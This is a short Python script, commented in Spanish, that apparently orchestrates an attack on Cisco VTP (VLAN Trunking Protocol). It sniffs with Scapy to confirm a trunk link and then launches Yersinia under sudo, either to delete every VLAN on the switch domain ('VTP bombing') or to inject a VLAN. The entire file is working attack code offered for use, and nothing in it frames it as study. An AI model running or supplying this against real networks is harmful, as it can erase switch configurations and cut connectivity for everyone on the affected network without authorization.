import subprocess
import time
from scapy.all import *

# ==========================================
# CONFIGURACIÓN
# ==========================================
interfaz = "ens3"  # Interfaz actualizada
ataque_tipo = "1"  # 1 = Borrar VLANs (VTP Bomb), 2 = Agregar VLAN

def banner():
    print("="*50)
    print("[*] VTP Attack Orchestrator (Scapy + Yersinia)")
    print("="*50)

def lanzar_yersinia(interfaz, tipo):
    print(f"\n[+] Lanzando Yersinia en {interfaz}...")
    if tipo == "1":
        print("[!] Ejecutando Ataque 1: BORRADO MASIVO DE VLANs (VTP Bombing)")
        comando = ["sudo", "yersinia", "vtp", "-attack", "1", "-i", interfaz]
    elif tipo == "2":
        print("[!] Ejecutando Ataque 2: INYECCIÓN DE VLAN")
        comando = ["sudo", "yersinia", "vtp", "-attack", "2", "-i", interfaz]
    else:
        print("[-] Tipo de ataque no válido.")
        return

    try:
        subprocess.run(comando, check=True)
    except KeyboardInterrupt:
        print("\n[*] Ataque detenido por el usuario.")
    except Exception as e:
        print(f"[-] Error al ejecutar Yersinia: {e}")

def detectar_vtp(paquete):
    if paquete.haslayer(LLC) and paquete.dst == "01:00:0c:cc:cc:cc":
        print("[+] ¡Paquete de protocolo de capa 2 detectado en ens3!")
        return True
    return False

if __name__ == "__main__":
    banner()
    print(f"[*] Escuchando en {interfaz} para confirmar enlace Trunk...")
    
    sniff(iface=interfaz, prn=detectar_vtp, count=1, timeout=5)
    
    print("\n[*] Preparando artillería...")
    time.sleep(1)
    
    lanzar_yersinia(interfaz, ataque_tipo)
